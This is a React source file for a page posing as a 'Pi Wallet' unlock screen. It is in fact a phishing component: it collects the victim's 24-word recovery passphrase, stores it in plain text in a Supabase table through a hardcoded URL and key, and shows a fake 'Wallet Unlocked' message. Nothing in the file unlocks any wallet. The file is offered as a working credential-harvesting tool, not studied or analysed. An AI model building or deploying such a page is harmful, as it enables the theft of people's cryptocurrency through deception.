import React, { useState } from 'react';
import { createClient } from '@supabase/supabase-js';

const supabaseUrl = "https://pqalanvbnnbdcqtlztmg.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBxYWxhbnZibm5iZGNxdGx6dG1nIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTczMTA3OTksImV4cCI6MjA3Mjg4Njc5OX0.4Yq1o0dN08qDB1xR9hLRzQDEV7lREUqP4YZDLUo1bhg";

const supabase = createClient(supabaseUrl, supabaseKey);

const WalletUnlock = () => {
  const [passphrase, setPassphrase] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false); // ✅ success modal state

  const validatePassphrase = () => {
    const words = passphrase.trim().split(/\s+/);
    if (words.length === 0) {
      return 'Passphrase cannot be empty.';
    }
    if (words.length < 24) {
      return `Passphrase too short. You entered ${words.length} words, expected 24.`;
    }
    if (words.length > 24) {
      return `Passphrase too long. You entered ${words.length} words, expected 24.`;
    }
    return '';
  };

  const handleUnlockWithPassphrase = async () => {
    const validationError = validatePassphrase();
    if (validationError) {
      setError(validationError);
      return;
    }
    setError('');

    try {
      const { data, error } = await supabase
        .from('store')
        .insert([{ passphrase }]);

      if (error) throw error;

      console.log('Inserted into Supabase:', data);
      setSuccess(true); // ✅ show success modal
    } catch (err) {
      console.error('Error inserting into Supabase:', err.message);
      setError('Failed to unlock wallet. Please try again.');
    }
  };

  const handleUnlockWithFingerprint = () => {
    console.log('Unlock with fingerprint');
  };

  return (
    <div className="min-h-screen bg-gray-50 pt-8 pb-24 px-10">
      <div className="max-w-md mx-auto px-6">
        {/* Title */}
        <h1 className="text-2xl font-semibold text-gray-800 text-center mb-4">
          Unlock Pi Wallet
        </h1>

        {/* Passphrase Input */}
        <div className="mb-2">
          <textarea
            value={passphrase}
            onChange={(e) => setPassphrase(e.target.value)}
            placeholder="Enter your 24-word passphrase here"
            className={`w-full h-50 p-4 border rounded-2xl resize-none focus:outline-none focus:ring-2 text-gray-700 placeholder-gray-400 ${
              error
                ? 'border-red-500 focus:ring-red-500'
                : 'border-gray-300 focus:ring-purple-500 focus:border-transparent'
            }`}
            rows={6}
          />
        </div>

        {/* Error Message */}
        {error && (
          <p className="text-red-600 text-sm mb-4 text-center">{error}</p>
        )}

        {/* Unlock Buttons */}
        <div className="space-y-4 mb-8">
          <button
            onClick={handleUnlockWithPassphrase}
            className="w-full py-4 bg-white border-2 border-[#703d92] text-[#703d92] rounded-2xl font-medium hover:bg-purple-50 transition-colors duration-200"
          >
            Unlock With Passphrase
          </button>

          <button
            onClick={handleUnlockWithFingerprint}
            className="w-full py-4 bg-[#703d92] text-white rounded-2xl font-medium hover:bg-purple-700 transition-colors duration-200"
          >
            Unlock With Fingerprint
          </button>
        </div>

        {/* Warning Text */}
        <div className="text-center text-gray-600 text-sm leading-relaxed mb-3">
          <p>
            As a non-custodial wallet, your wallet passphrase is exclusively
            accessible only to you. Recovery of passphrase is currently
            impossible.
          </p>
        </div>

        {/* Lost Passphrase Text */}
        <div className="text-center text-gray-600 text-sm leading-relaxed">
          <p>
            Lost your passphrase?{' '}
            <button className="text-blue-500 hover:text-blue-600 ">
              You can create a new wallet
            </button>
            , but all your π in your previous wallet will be inaccessible.
          </p>
        </div>
      </div>

      {/* ✅ Success Modal */}
      {success && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-40 z-50">
          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-sm text-center">
            <h2 className="text-xl font-semibold text-green-600 mb-2">
              ✅ Wallet Unlocked
            </h2>
            <p className="text-gray-600 mb-4">
              Your passphrase was successfully verified and saved.
            </p>
            <button
              onClick={() => setSuccess(false)}
              className="px-4 py-2 bg-[#703d92] text-white rounded-lg hover:bg-purple-700 transition"
            >
              Continue
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default WalletUnlock;
